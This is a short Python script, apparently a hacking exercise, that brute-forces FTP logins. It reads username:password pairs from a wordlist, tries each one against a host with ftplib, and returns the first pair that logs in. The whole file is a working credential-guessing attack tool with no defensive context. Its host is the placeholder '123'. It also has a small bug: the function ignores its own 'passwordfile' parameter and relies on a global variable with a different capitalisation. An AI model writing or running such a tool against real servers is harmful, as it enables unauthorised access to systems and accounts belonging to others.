import ftplib


def bruteForceLogin(hostname, passwordfile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        userName = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying : " + str(userName) + " / " + str(password))
        try:
            ftp = ftplib . FTP(hostname)
            ftp.login(userName, password)
            print(" FTP Login succeded : " +
                  str(userName) + " / " + str(password))
            ftp.quit()
            return (userName, password)
        except Exception:
            pass


if __name__ == '__main__':
    hostName = "123"
    passwordFile = 'wordlist1.txt'
    bruteForceLogin(hostName, passwordFile)
